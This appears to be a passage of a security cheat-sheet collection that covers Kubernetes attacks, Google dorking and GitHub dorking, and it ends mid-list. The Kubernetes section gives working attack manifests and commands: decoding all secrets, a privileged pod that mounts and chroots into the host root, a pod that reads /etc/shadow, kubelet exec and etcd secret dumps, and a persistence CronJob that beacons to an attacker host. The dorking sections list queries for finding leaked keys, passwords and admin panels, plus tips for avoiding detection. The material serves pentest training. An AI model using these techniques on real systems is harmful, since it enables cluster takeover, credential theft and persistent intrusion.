kubectl get namespaces
kubectl get ns

# All resources in namespace
kubectl get all -n NAMESPACE

# Pods
kubectl get pods --all-namespaces
kubectl get pods -o wide
kubectl describe pod POD_NAME

# Services
kubectl get services --all-namespaces
kubectl get svc

# Deployments
kubectl get deployments --all-namespaces
```

---

## 📦 Container Security — 🔑 RBAC Enumeration

### Check Current Permissions
```bash
# What can I do?
kubectl auth can-i --list

# Specific permissions
kubectl auth can-i create pods
kubectl auth can-i get secrets
kubectl auth can-i create pods --as=system:serviceaccount:default:default

# Get role bindings
kubectl get rolebindings --all-namespaces
kubectl get clusterrolebindings

# Get roles
kubectl get roles --all-namespaces
kubectl get clusterroles

# Describe role
kubectl describe role ROLE_NAME -n NAMESPACE
kubectl describe clusterrole ROLE_NAME
```

### Dangerous RBAC Permissions
```yaml
# Can create pods = potential escape
- pods/create
- pods/*

# Can exec into pods
- pods/exec

# Can read secrets
- secrets/get
- secrets/list

# Can modify RBAC
- rolebindings/*
- clusterrolebindings/*

# Cluster admin
- '*' on '*'
```

---

## 📦 Container Security — 🔐 Secrets Extraction

### List & Read Secrets
```bash
# List secrets
kubectl get secrets --all-namespaces
kubectl get secrets -n NAMESPACE

# Get secret content (base64 encoded)
kubectl get secret SECRET_NAME -o yaml
kubectl get secret SECRET_NAME -o jsonpath='{.data}'

# Decode secret
kubectl get secret SECRET_NAME -o jsonpath='{.data.password}' | base64 -d

# Get all secrets decoded
kubectl get secrets -o json | jq '.items[].data | to_entries[] | "\(.key): \(.value | @base64d)"'
```

### Common Secret Locations
```bash
# Service account tokens
kubectl get secret -n kube-system | grep token

# Docker registry credentials
kubectl get secret regcred -o jsonpath='{.data.\.dockerconfigjson}' | base64 -d

# TLS certificates
kubectl get secret tls-secret -o jsonpath='{.data.tls\.crt}' | base64 -d
```

---

## 📦 Container Security — 🚀 Pod Escape & Privilege Escalation

### Privileged Pod Creation
```yaml
# Create privileged pod
apiVersion: v1
kind: Pod
metadata:
  name: privileged-pod
spec:
  hostPID: true
  hostNetwork: true
  hostIPC: true
  containers:
  - name: pwn
    image: alpine
    command: ["/bin/sh", "-c", "sleep infinity"]
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: host-root
  volumes:
  - name: host-root
    hostPath:
      path: /
      type: Directory
```

```bash
# Apply and exec
kubectl apply -f privileged-pod.yaml
kubectl exec -it privileged-pod -- chroot /host /bin/bash
# Now you have host access!
```

### Pod with Service Account Token Mount
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: token-pod
spec:
  serviceAccountName: admin-sa  # If you can use admin SA
  automountServiceAccountToken: true
  containers:
  - name: attacker
    image: alpine
    command: ["/bin/sh", "-c", "sleep infinity"]
```

### Escape via hostPath
```yaml
# If you can create pods with hostPath
apiVersion: v1
kind: Pod
metadata:
  name: escape-pod
spec:
  containers:
  - name: escape
    image: alpine
    command: ["/bin/sh", "-c", "cat /host-etc/shadow"]
    volumeMounts:
    - mountPath: /host-etc
      name: etc-vol
  volumes:
  - name: etc-vol
    hostPath:
      path: /etc
```

---

## 📦 Container Security — 🌐 Kubelet API Exploitation

### Anonymous Kubelet Access
```bash
# Check if kubelet allows anonymous
curl -k https://NODE_IP:10250/pods
curl -k https://NODE_IP:10250/runningpods

# Using kubeletctl
kubeletctl pods -s NODE_IP
kubeletctl scan rce -s NODE_IP

# Execute commands
kubeletctl exec "/bin/bash" -p POD_NAME -c CONTAINER_NAME -s NODE_IP
```

### Read-Only Kubelet (10255)
```bash
# If port 10255 is open (read-only)
curl http://NODE_IP:10255/pods
curl http://NODE_IP:10255/spec
```

---

## 📦 Container Security — 🎯 Attacking Kubernetes Components

### API Server Exploitation
```bash
# Check if API is accessible without auth
curl -k https://API_SERVER:6443/api/v1/namespaces

# Check for anonymous access
curl -k https://API_SERVER:6443/api/v1/namespaces/default/pods

# Common ports
# 6443 - API Server (HTTPS)
# 8080 - API Server (HTTP - insecure)
```

### etcd Exploitation
```bash
# If etcd is exposed (port 2379)
etcdctl --endpoints=http://ETCD_IP:2379 get / --prefix --keys-only

# Get secrets from etcd
etcdctl --endpoints=http://ETCD_IP:2379 get /registry/secrets --prefix

# Using curl
curl http://ETCD_IP:2379/v2/keys/?recursive=true
```

### Dashboard Exploitation
```bash
# Check for exposed dashboard (no auth)
# Common URLs:
http://NODE_IP:30000
http://NODE_IP:8443/api/v1/namespaces/kubernetes-dashboard/services/https:kubernetes-dashboard:/proxy/

# If accessible, create admin token or exec into pods
```

---

## 📦 Container Security — 🛠️ Kubernetes Pentesting Tools

### kube-hunter
```bash
# Install
pip install kube-hunter

# Remote scan
kube-hunter --remote TARGET_CLUSTER

# Internal scan (from pod)
kube-hunter --pod

# List vulnerabilities
kube-hunter --list
```

### Peirates
```bash
# K8s attack framework
git clone https://github.com/inguardians/peirates
cd peirates && go build

# Run
./peirates

# Menu options:
# - Get secrets
# - Mount service account
# - Create privileged pod
# - Exec into pods
```

### kubeaudit
```bash
# Security audit
kubeaudit all

# Specific checks
kubeaudit privileged
kubeaudit capabilities
kubeaudit hostns
kubeaudit nonroot
```

### kubectl-who-can
```bash
# Install
kubectl krew install who-can

# Check who can do what
kubectl who-can create pods
kubectl who-can get secrets
kubectl who-can '*' '*'
```

---

## 📦 Container Security — 📋 Kubernetes Pentesting Checklist

```markdown
□ Enumerate cluster info (nodes, namespaces)
□ Check current RBAC permissions (auth can-i --list)
□ List and extract secrets
□ Check for privileged pods
□ Test kubelet API access (10250/10255)
□ Check for exposed API server
□ Test anonymous authentication
□ Check for exposed etcd
□ Check for exposed dashboard
□ Attempt pod creation with privileges
□ Run kube-hunter for automated scan
□ Check network policies
```

---

## 📦 Container Security — 🔒 Post-Exploitation

### Persistence via CronJob
```yaml
apiVersion: batch/v1
kind: CronJob
metadata:
  name: persistence
spec:
  schedule: "* * * * *"
  jobTemplate:
    spec:
      template:
        spec:
          containers:
          - name: shell
            image: alpine
            command: ["/bin/sh", "-c", "wget http://ATTACKER/beacon"]
          restartPolicy: OnFailure
```

### Backdoor via Mutating Webhook
```bash
# If you can create MutatingWebhookConfiguration
# Every new pod can be modified to include your code
```

---

## 📦 Container Security — 🔗 Related Cheatsheets

- [Docker Pentesting](./Docker-Pentesting.md)
- [Cloud Security](../Cloud-Security/README.md)

---

**Back to Overview:** [🐳 Container Security](./README.md)

## 🔍 Google Dorking — # 🔍 Google Dorking - Complete Cheatsheet

```
   ██████╗  ██████╗  ██████╗  ██████╗ ██╗     ███████╗
  ██╔════╝ ██╔═══██╗██╔═══██╗██╔════╝ ██║     ██╔════╝
  ██║  ███╗██║   ██║██║   ██║██║  ███╗██║     █████╗  
  ██║   ██║██║   ██║██║   ██║██║   ██║██║     ██╔══╝  
  ╚██████╔╝╚██████╔╝╚██████╔╝╚██████╔╝███████╗███████╗
   ╚═════╝  ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝╚══════╝
  ██████╗  ██████╗ ██████╗ ██╗  ██╗██╗███╗   ██╗ ██████╗ 
  ██╔══██╗██╔═══██╗██╔══██╗██║ ██╔╝██║████╗  ██║██╔════╝ 
  ██║  ██║██║   ██║██████╔╝█████╔╝ ██║██╔██╗ ██║██║  ███╗
  ██║  ██║██║   ██║██╔══██╗██╔═██╗ ██║██║╚██╗██║██║   ██║
  ██████╔╝╚██████╔╝██║  ██║██║  ██╗██║██║ ╚████║╚██████╔╝
  ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝ 
```

<p align="center">
  <img src="https://img.shields.io/badge/Google-Dorking-red?style=for-the-badge" alt="Google Dorking">
  <img src="https://img.shields.io/badge/OSINT-orange?style=for-the-badge" alt="OSINT">
  <img src="https://img.shields.io/badge/Bug-Bounty-blue?style=for-the-badge" alt="Bug Bounty">
  <img src="https://img.shields.io/badge/Information-Gathering-green?style=for-the-badge" alt="Info Gathering">
</p>

<p align="center">
  <b>🎯 Advanced Google Search Techniques for Security Researchers</b>
</p>

---

## 🔍 Google Dorking — 📋 Table of Contents

- [Introduction](#-introduction)
- [Basic Operators](#-basic-operators)
- [Advanced Operators](#-advanced-operators)
- [Combining Operators](#-combining-operators)
- [File Discovery](#-file-discovery)
- [Directory Listing](#-directory-listing)
- [Admin Panels](#-admin-panels)
- [Database & SQL](#-database--sql)
- [Configuration Files](#-configuration-files)
- [Credentials & Secrets](#-credentials--secrets)
- [Vulnerable Servers](#-vulnerable-servers)
- [Bug Bounty Dorks](#-bug-bounty-dorks)
- [CMS Specific](#-cms-specific)
- [Quick Reference](#-quick-reference)
- [Tools & Automation](#-tools--automation)
- [Resources](#-resources)

---

## 🔍 Google Dorking — 🔧 Basic Operators

### Site Operator

Limit search to specific domain:

```
site:example.com                     # Only example.com
site:*.example.com                   # All subdomains
site:example.com -www                # Exclude www
site:.gov                            # Government sites
site:.edu                            # Educational sites
```

### Inurl Operator

Search in URL:

```
inurl:admin                          # admin in URL
inurl:login                          # login pages
inurl:dashboard                      # dashboards
inurl:config                         # config files
inurl:backup                         # backup files
```

### Intitle Operator

Search in page title:

```
intitle:"index of"                   # Directory listings
intitle:admin                        # Admin pages
intitle:login                        # Login pages
intitle:"dashboard"                  # Dashboards
intitle:"control panel"              # Control panels
```

### Intext Operator

Search in page content:

```
intext:"password"                    # Password in text
intext:"username"                    # Username in text
intext:"api_key"                     # API keys
intext:"secret"                      # Secrets
```

### Filetype Operator

Search specific file types:

```
filetype:pdf                         # PDF files
filetype:doc                         # Word documents
filetype:xls                         # Excel files
filetype:sql                         # SQL files
filetype:log                         # Log files
filetype:bak                         # Backup files
filetype:env                         # Environment files
```

---

## 🔍 Google Dorking — ⚡ Advanced Operators

### All Variants

```
allinurl:admin login                 # All words in URL
allintitle:admin panel               # All words in title
allintext:password username          # All words in text
```

### Cache & Link

```
cache:example.com                    # Cached version
link:example.com                     # Pages linking to
related:example.com                  # Related sites
```

### Date Range

```
after:2023-01-01                     # After date
before:2024-01-01                    # Before date
daterange:2458850-2459215            # Julian date range
```

### Wildcards & OR

```
admin * panel                        # Wildcard
admin OR login                       # Either term
"admin panel"                        # Exact phrase
-inurl:https                         # Exclude HTTPS
```

### Number Range

```
inurl:id= 1..1000                    # Number range
price $100..$500                     # Price range
```

---

## 🔍 Google Dorking — 🔗 Combining Operators

### Basic Combinations

```
site:example.com filetype:pdf
site:example.com inurl:admin
site:example.com intitle:login
site:example.com intext:password
```

### Advanced Combinations

```
site:example.com filetype:sql intext:password
site:example.com inurl:admin intitle:login
site:example.com filetype:log intext:error
site:example.com ext:php inurl:config
```

### Bug Bounty Combinations

```
site:target.com (filetype:pdf | filetype:doc | filetype:xls)
site:target.com (inurl:admin | inurl:login | inurl:dashboard)
site:target.com (ext:sql | ext:bak | ext:log)
```

---

## 🔍 Google Dorking — 📁 File Discovery

### Sensitive Documents

```
# Office Documents
site:target.com filetype:doc
site:target.com filetype:docx
site:target.com filetype:xls
site:target.com filetype:xlsx
site:target.com filetype:ppt
site:target.com filetype:pdf

# Text Files
site:target.com filetype:txt
site:target.com filetype:rtf
site:target.com filetype:csv
```

### Backup Files

```
site:target.com filetype:bak
site:target.com filetype:backup
site:target.com filetype:old
site:target.com filetype:orig
site:target.com ext:bak
site:target.com inurl:backup
site:target.com intitle:"backup"
```

### Database Files

```
site:target.com filetype:sql
site:target.com filetype:db
site:target.com filetype:mdb
site:target.com filetype:sqlite
site:target.com filetype:dump
site:target.com ext:sql intext:INSERT
```

### Log Files

```
site:target.com filetype:log
site:target.com ext:log
site:target.com inurl:log
site:target.com intext:"error" filetype:log
site:target.com intext:"exception" filetype:log
site:target.com intext:"fatal" filetype:log
```

### Configuration Files

```
site:target.com filetype:conf
site:target.com filetype:config
site:target.com filetype:cfg
site:target.com filetype:ini
site:target.com filetype:env
site:target.com filetype:yml
site:target.com filetype:yaml
site:target.com filetype:xml
site:target.com filetype:json
```

### Source Code

```
site:target.com filetype:php
site:target.com filetype:asp
site:target.com filetype:aspx
site:target.com filetype:jsp
site:target.com filetype:py
site:target.com filetype:rb
site:target.com filetype:js
```

---

## 🔍 Google Dorking — 📂 Directory Listing

### Index Of

```
intitle:"index of" site:target.com
intitle:"index of /" site:target.com
intitle:"directory listing" site:target.com
intitle:"parent directory" site:target.com
```

### Specific Directories

```
intitle:"index of" "backup" site:target.com
intitle:"index of" "password" site:target.com
intitle:"index of" "admin" site:target.com
intitle:"index of" "config" site:target.com
intitle:"index of" "ftp" site:target.com
intitle:"index of" "logs" site:target.com
intitle:"index of" "uploads" site:target.com
intitle:"index of" ".git" site:target.com
intitle:"index of" ".svn" site:target.com
```

### File Types in Directories

```
intitle:"index of" "*.sql" site:target.com
intitle:"index of" "*.bak" site:target.com
intitle:"index of" "*.log" site:target.com
intitle:"index of" "*.zip" site:target.com
intitle:"index of" "*.tar.gz" site:target.com
```

---

## 🔍 Google Dorking — 🔐 Admin Panels

### Generic Admin

```
site:target.com inurl:admin
site:target.com inurl:administrator
site:target.com inurl:adminlogin
site:target.com inurl:admin/login
site:target.com inurl:admin.php
site:target.com inurl:admin.asp
site:target.com intitle:admin
site:target.com intitle:"admin login"
site:target.com intitle:"admin panel"
site:target.com intitle:"administrator"
```

### CPanel & Hosting

```
site:target.com inurl:cpanel
site:target.com inurl:webmail
site:target.com inurl:whm
site:target.com intitle:"cPanel"
site:target.com inurl:2082
site:target.com inurl:2083
site:target.com inurl:2086
site:target.com inurl:2087
```

### Database Admin

```
site:target.com inurl:phpmyadmin
site:target.com inurl:phpMyAdmin
site:target.com intitle:"phpMyAdmin"
site:target.com inurl:adminer
site:target.com inurl:pgadmin
site:target.com intitle:"pgAdmin"
site:target.com inurl:mysql
```

### Control Panels

```
site:target.com intitle:"dashboard"
site:target.com intitle:"control panel"
site:target.com inurl:portal
site:target.com inurl:cms
site:target.com inurl:backend
```

---

## 🔍 Google Dorking — 💾 Database & SQL

### SQL Files

```
site:target.com filetype:sql
site:target.com filetype:sql intext:password
site:target.com filetype:sql intext:"INSERT INTO"
site:target.com filetype:sql intext:"CREATE TABLE"
site:target.com ext:sql "INSERT INTO `users`"
```

### SQL Errors

```
site:target.com "SQL syntax" error
site:target.com "mysql_fetch_array"
site:target.com "mysql_num_rows"
site:target.com "mysql_connect"
site:target.com "mysqli_"
site:target.com "ORA-" error
site:target.com "PostgreSQL" error
site:target.com "ODBC" error
```

### SQL Injection Indicators

```
site:target.com inurl:id=
site:target.com inurl:page=
site:target.com inurl:cat=
site:target.com inurl:item=
site:target.com inurl:pid=
site:target.com inurl:product_id=
site:target.com inurl:news_id=
```

### Database Dumps

```
site:target.com "dump" filetype:sql
site:target.com "database dump" filetype:sql
site:target.com filetype:sql "-- MySQL dump"
site:target.com filetype:sql "-- phpMyAdmin SQL Dump"
```

---

## 🔍 Google Dorking — ⚙️ Configuration Files

### Web Server Config

```
site:target.com filetype:conf
site:target.com filetype:conf intext:password
site:target.com "httpd.conf"
site:target.com "nginx.conf"
site:target.com ".htaccess"
site:target.com ".htpasswd"
site:target.com "web.config"
```

### Application Config

```
site:target.com filetype:env
site:target.com ".env" filetype:env
site:target.com "config.php" intext:password
site:target.com "settings.php" intext:password
site:target.com "database.php" intext:password
site:target.com "wp-config.php"
site:target.com "configuration.php"
site:target.com "config.yml"
site:target.com "config.json"
```

### Git Config

```
site:target.com ".git/config"
site:target.com intitle:"index of" ".git"
site:target.com inurl:".git"
site:target.com filetype:git
```

### AWS & Cloud

```
site:target.com filetype:pem
site:target.com filetype:ppk
site:target.com "aws_access_key_id"
site:target.com "aws_secret_access_key"
site:target.com "AKIA"                    # AWS Key prefix
site:target.com "credentials" filetype:json
```

---

## 🔍 Google Dorking — 🔑 Credentials & Secrets

### Passwords

```
site:target.com intext:password
site:target.com intext:"password is"
site:target.com intext:"default password"
site:target.com filetype:txt password
site:target.com filetype:log password
site:target.com "password" filetype:xls
site:target.com "password" filetype:csv
```

### Username & Password Combos

```
site:target.com intext:username intext:password
site:target.com "username" "password" filetype:txt
site:target.com "login" "password" filetype:xls
site:target.com intext:"username:" intext:"password:"
```

### API Keys & Tokens

```
site:target.com intext:api_key
site:target.com intext:apikey
site:target.com intext:api-key
site:target.com intext:"api key"
site:target.com intext:access_token
site:target.com intext:auth_token
site:target.com intext:secret_key
site:target.com intext:bearer
```

### Email Addresses

```
site:target.com "@target.com"
site:target.com filetype:xls "@target.com"
site:target.com filetype:csv "email"
site:target.com intext:"@gmail.com"
```

### Private Keys

```
site:target.com "BEGIN RSA PRIVATE KEY"
site:target.com "BEGIN DSA PRIVATE KEY"
site:target.com "BEGIN EC PRIVATE KEY"
site:target.com "BEGIN PRIVATE KEY"
site:target.com filetype:pem
site:target.com filetype:key
site:target.com "id_rsa"
site:target.com "id_dsa"
```

---

## 🔍 Google Dorking — ⚠️ Vulnerable Servers

### Open Directories

```
intitle:"index of" site:target.com
intitle:"directory listing" site:target.com
intitle:"Apache" "server at" site:target.com
```

### Default Pages

```
site:target.com intitle:"Apache2 Ubuntu Default Page"
site:target.com intitle:"Welcome to nginx"
site:target.com intitle:"Test Page for Apache"
site:target.com intitle:"IIS Windows Server"
site:target.com intitle:"Welcome to CentOS"
```

### Error Pages

```
site:target.com "404 Not Found" inurl:admin
site:target.com "500 Internal Server Error"
site:target.com "Error establishing database connection"
site:target.com "Parse error" "syntax error"
site:target.com "Warning:" "mysql_"
site:target.com "Fatal error:" "php"
```

### Exposed Services

```
site:target.com intitle:"Webmin"
site:target.com intitle:"Jenkins"
site:target.com intitle:"Grafana"
site:target.com intitle:"Kibana"
site:target.com intitle:"Elasticsearch"
site:target.com intitle:"Solr Admin"
site:target.com intitle:"RabbitMQ Management"
site:target.com intitle:"Redis Commander"
```

---

## 🔍 Google Dorking — 🐛 Bug Bounty Dorks

### Quick Wins

```
# Sensitive Files
site:target.com (filetype:sql | filetype:bak | filetype:log | filetype:env)

# Admin Panels
site:target.com (inurl:admin | inurl:login | inurl:dashboard)

# Config Files
site:target.com (filetype:conf | filetype:config | filetype:ini | filetype:env)

# Credentials
site:target.com (intext:password | intext:api_key | intext:secret)
```

### Subdomain Discovery

```
site:*.target.com -www
site:*.target.com -www -mail
site:*.*.target.com
```

### API Endpoints

```
site:target.com inurl:api
site:target.com inurl:api/v1
site:target.com inurl:api/v2
site:target.com inurl:/rest/
site:target.com inurl:graphql
site:target.com inurl:swagger
site:target.com inurl:swagger-ui
site:target.com filetype:json inurl:api
```

### Development & Staging

```
site:dev.target.com
site:staging.target.com
site:test.target.com
site:uat.target.com
site:qa.target.com
site:demo.target.com
site:beta.target.com
site:sandbox.target.com
```

### Authentication Pages

```
site:target.com inurl:login
site:target.com inurl:signin
site:target.com inurl:signup
site:target.com inurl:register
site:target.com inurl:auth
site:target.com inurl:oauth
site:target.com inurl:sso
site:target.com inurl:forgot
site:target.com inurl:reset
```

### File Upload

```
site:target.com inurl:upload
site:target.com intitle:upload
site:target.com inurl:file
site:target.com "choose file"
site:target.com "upload file"
```

---

## 🔍 Google Dorking — 📱 CMS Specific

### WordPress

```
site:target.com inurl:wp-content
site:target.com inurl:wp-includes
site:target.com inurl:wp-admin
site:target.com inurl:wp-login
site:target.com "wp-config.php"
site:target.com filetype:sql "wp_users"
site:target.com intitle:"WordPress" inurl:readme
```

### Joomla

```
site:target.com inurl:administrator
site:target.com inurl:com_
site:target.com "configuration.php"
site:target.com "Joomla"
```

### Drupal

```
site:target.com inurl:node/
site:target.com inurl:sites/default/files
site:target.com "Drupal"
site:target.com "CHANGELOG.txt"
```

### Magento

```
site:target.com inurl:app/etc/local.xml
site:target.com inurl:downloader
site:target.com "Magento"
```

---

## 🔍 Google Dorking — 📊 Quick Reference

### Essential Operators

| Operator | Function | Example |
|----------|----------|---------|
| `site:` | Domain specific | `site:target.com` |
| `inurl:` | Search in URL | `inurl:admin` |
| `intitle:` | Search in title | `intitle:login` |
| `intext:` | Search in content | `intext:password` |
| `filetype:` | File extension | `filetype:sql` |
| `ext:` | File extension | `ext:pdf` |
| `cache:` | Cached version | `cache:target.com` |
| `"..."` | Exact phrase | `"admin panel"` |
| `-` | Exclude | `-site:www` |
| `OR` / `|` | Either term | `admin OR login` |
| `*` | Wildcard | `admin * panel` |

### Top 10 Dorks for Bug Bounty

| # | Dork | Purpose |
|---|------|---------|
| 1 | `site:target.com filetype:sql` | Database files |
| 2 | `site:target.com inurl:admin` | Admin panels |
| 3 | `site:target.com filetype:log` | Log files |
| 4 | `site:target.com filetype:env` | Environment files |
| 5 | `site:target.com intext:password filetype:txt` | Passwords |
| 6 | `intitle:"index of" site:target.com` | Directory listing |
| 7 | `site:target.com inurl:api` | API endpoints |
| 8 | `site:target.com filetype:bak` | Backup files |
| 9 | `site:*.target.com -www` | Subdomains |
| 10 | `site:target.com "api_key"` | API keys |

---

## 🔍 Google Dorking — 🛠️ Tools & Automation

### Google Dorking Tools

| Tool | Description | URL |
|------|-------------|-----|
| **Google Hacking Database** | Exploit-DB dork collection | [GHDB](https://www.exploit-db.com/google-hacking-database) |
| **DorkSearch** | Dork generator | [DorkSearch](https://dorksearch.com) |
| **Pagodo** | Passive Google dorking | GitHub |
| **GooDork** | Python dorking tool | GitHub |
| **GooFuzz** | Fuzzing with Google | GitHub |

### Dorking Websites

```
# Google Hacking Database
https://www.exploit-db.com/google-hacking-database

# Pentest-Tools
https://pentest-tools.com/information-gathering/google-hacking

# DorkSearch
https://dorksearch.com
```

### Automation Script Example

```bash
#!/bin/bash
# Simple Google Dork automation

TARGET="target.com"

DORKS=(
    "site:$TARGET filetype:sql"
    "site:$TARGET filetype:log"
    "site:$TARGET filetype:env"
    "site:$TARGET inurl:admin"
    "site:$TARGET intext:password"
)

for dork in "${DORKS[@]}"; do
    echo "[*] Dork: $dork"
    echo "URL: https://www.google.com/search?q=$(echo $dork | sed 's/ /+/g')"
    echo ""
done
```

---

## 🔍 Google Dorking — 💡 Tips & Best Practices

### Bug Bounty Tips

1. **Start Broad, Go Specific**
   ```
   site:target.com                    # First
   site:target.com filetype:sql       # Then specific
   ```

2. **Use Multiple Search Engines**
   - Google, Bing, DuckDuckGo, Yandex
   
3. **Check Cached Pages**
   ```
   cache:target.com/admin
   ```

4. **Look for Subdomains**
   ```
   site:*.target.com -www
   ```

5. **Rate Limit Your Searches**
   - Google may block excessive queries

### Avoid Detection

```
# Use different IPs/VPNs
# Add delays between searches
# Vary your search patterns
# Use different browsers
```

---

## 🔍 Google Dorking — 📚 Resources

### Official Resources
- [Google Search Operators](https://support.google.com/websearch/answer/2466433)
- [Google Hacking Database](https://www.exploit-db.com/google-hacking-database)

### Books & Guides
- "Google Hacking for Penetration Testers" by Johnny Long
- OWASP Testing Guide

### Related Cheatsheets
- [Shodan](../Shodan/README.md)
- [GitHub Dorking](../GitHub-Dorking/README.md)
- [Subfinder](../Subfinder/README.md)

---

<p align="center">
  <b>🔍 Find What Others Hide!</b><br>
  <i>Master the art of Google Dorking</i>
</p>

## 🔍 GitHub Dorking — # 🐙 GitHub Dorking - Complete Cheatsheet

```
   ██████╗ ██╗████████╗██╗  ██╗██╗   ██╗██████╗ 
  ██╔════╝ ██║╚══██╔══╝██║  ██║██║   ██║██╔══██╗
  ██║  ███╗██║   ██║   ███████║██║   ██║██████╔╝
  ██║   ██║██║   ██║   ██╔══██║██║   ██║██╔══██╗
  ╚██████╔╝██║   ██║   ██║  ██║╚██████╔╝██████╔╝
   ╚═════╝ ╚═╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ 
  ██████╗  ██████╗ ██████╗ ██╗  ██╗██╗███╗   ██╗ ██████╗ 
  ██╔══██╗██╔═══██╗██╔══██╗██║ ██╔╝██║████╗  ██║██╔════╝ 
  ██║  ██║██║   ██║██████╔╝█████╔╝ ██║██╔██╗ ██║██║  ███╗
  ██║  ██║██║   ██║██╔══██╗██╔═██╗ ██║██║╚██╗██║██║   ██║
  ██████╔╝╚██████╔╝██║  ██║██║  ██╗██║██║ ╚████║╚██████╔╝
  ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝ 
```

<p align="center">
  <img src="https://img.shields.io/badge/GitHub-Dorking-red?style=for-the-badge" alt="GitHub Dorking">
  <img src="https://img.shields.io/badge/Secret-Hunting-orange?style=for-the-badge" alt="Secret Hunting">
  <img src="https://img.shields.io/badge/Bug-Bounty-blue?style=for-the-badge" alt="Bug Bounty">
  <img src="https://img.shields.io/badge/OSINT-green?style=for-the-badge" alt="OSINT">
</p>

<p align="center">
  <b>🔐 Find Exposed Secrets, API Keys, and Credentials in GitHub Repositories</b>
</p>

---

## 🔍 GitHub Dorking — 📋 Table of Contents

- [Introduction](#-introduction)
- [GitHub Search Syntax](#-github-search-syntax)
- [API Keys & Tokens](#-api-keys--tokens)
- [Database Credentials](#-database-credentials)
- [Private Keys](#-private-keys)
- [Configuration Files](#-configuration-files)
- [Cloud Secrets](#-cloud-secrets)
- [Passwords & Credentials](#-passwords--credentials)
- [Bug Bounty Targets](#-bug-bounty-targets)
- [Advanced Techniques](#-advanced-techniques)
- [Automation Tools](#-automation-tools)
- [Quick Reference](#-quick-reference)
- [Resources](#-resources)

---

## 🔍 GitHub Dorking — 🔧 GitHub Search Syntax

### Basic Search URL

```
https://github.com/search?q=YOUR_QUERY&type=code
```

### Search Qualifiers

| Qualifier | Description | Example |
|-----------|-------------|---------|
| `in:file` | Search in file content | `password in:file` |
| `in:path` | Search in file path | `config in:path` |
| `filename:` | Search by filename | `filename:.env` |
| `extension:` | Search by extension | `extension:json` |
| `language:` | Search by language | `language:python` |
| `user:` | Search user's repos | `user:target` |
| `org:` | Search org's repos | `org:company` |
| `repo:` | Search specific repo | `repo:user/repo` |
| `path:` | Search in path | `path:config/` |
| `size:` | File size | `size:>1000` |

### Boolean Operators

```
# AND (space)
password database

# OR
password OR secret

# NOT (-)
password -test -example

# Exact phrase
"api_key"

# Combine
org:target "api_key" NOT test
```

---

## 🔍 GitHub Dorking — 🔑 API Keys & Tokens

### AWS Keys

```
# AWS Access Key ID
AKIA
AKID
"aws_access_key_id"
"AWS_ACCESS_KEY_ID"

# AWS Secret Key
"aws_secret_access_key"
"AWS_SECRET_ACCESS_KEY"

# Combined
filename:.env AWS_ACCESS_KEY
org:target AKIA
org:target "aws_secret"
```

### Google Cloud

```
# GCP API Key
"AIza"
"AIzaSy"

# GCP Service Account
"type": "service_account"
filename:credentials.json "private_key"
"client_secret" extension:json

# Firebase
"apiKey" "authDomain" "databaseURL"
filename:firebase
```

### Stripe

```
# Stripe Keys
"sk_live_"
"rk_live_"
"pk_live_"
sk_live
rk_live

# Combined
org:target sk_live
filename:.env STRIPE_SECRET
```

### Twilio

```
# Twilio SID & Token
"TWILIO_ACCOUNT_SID"
"TWILIO_AUTH_TOKEN"
"twilio" "sid" "token"
```

### GitHub Tokens

```
# Personal Access Tokens
ghp_
gho_
ghu_
ghs_
ghr_

# GitHub Token patterns
"GITHUB_TOKEN"
"github_token"
"gh_token"
filename:.env GITHUB_TOKEN
```

### Slack

```
# Slack Tokens
"xoxb-"
"xoxp-"
"xoxs-"
"xoxa-"

# Slack Webhook
"hooks.slack.com"
"T[A-Z0-9]{8}/B[A-Z0-9]{8}/[a-zA-Z0-9]{24}"
```

### Other API Keys

```
# SendGrid
"SG."
"SENDGRID_API_KEY"

# Mailgun
"key-"
"MAILGUN_API_KEY"

# Mailchimp
"[0-9a-f]{32}-us[0-9]{2}"

# Square
"sq0atp-"
"sq0csp-"

# PayPal
"PAYPAL"

# Heroku
"HEROKU_API_KEY"
"[h|H]eroku.*[0-9A-F]{8}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{12}"
```

---

## 🔍 GitHub Dorking — 💾 Database Credentials

### MySQL

```
# MySQL Connection Strings
"mysql://"
"mysql_password"
"MYSQL_PASSWORD"
"DB_PASSWORD"

# Combined
filename:.env MYSQL_PASSWORD
filename:config.php "mysql" "password"
"mysqli_connect" password
```

### PostgreSQL

```
# PostgreSQL
"postgres://"
"postgresql://"
"POSTGRES_PASSWORD"
"PG_PASSWORD"
filename:.env POSTGRES
```

### MongoDB

```
# MongoDB Connection
"mongodb://"
"mongodb+srv://"
"MONGO_URI"
"MONGODB_URI"

# With credentials
"mongodb://.*:.*@"
filename:.env MONGO
```

### Redis

```
# Redis
"redis://"
"REDIS_PASSWORD"
"REDIS_URL"
```

### SQLite

```
# SQLite
filename:*.sqlite
filename:*.db
extension:sqlite
```

### Generic Database

```
# Connection strings
"connection_string"
"connectionString"
"DB_CONNECTION"
"DATABASE_URL"

# Credentials
"db_password"
"db_pass"
"database_password"
```

---

## 🔍 GitHub Dorking — 🔐 Private Keys

### SSH Keys

```
# Private SSH Keys
"-----BEGIN RSA PRIVATE KEY-----"
"-----BEGIN DSA PRIVATE KEY-----"
"-----BEGIN EC PRIVATE KEY-----"
"-----BEGIN OPENSSH PRIVATE KEY-----"
"-----BEGIN PRIVATE KEY-----"

# Files
filename:id_rsa
filename:id_dsa
filename:id_ed25519
extension:pem
extension:key

# Combined
filename:id_rsa -example -sample
```

### PGP/GPG Keys

```
"-----BEGIN PGP PRIVATE KEY BLOCK-----"
filename:*.asc "PRIVATE KEY"
```

### SSL/TLS Certificates

```
"-----BEGIN CERTIFICATE-----"
filename:*.crt
filename:*.cer
extension:pem "CERTIFICATE"
```

---

## 🔍 GitHub Dorking — ⚙️ Configuration Files

### Environment Files

```
# .env files
filename:.env
filename:.env.local
filename:.env.production
filename:.env.development
filename:.env.staging
filename:.env.backup

# With secrets
filename:.env DB_PASSWORD
filename:.env API_KEY
filename:.env SECRET
```

### Config Files

```
# Various config files
filename:config.json
filename:config.yml
filename:config.yaml
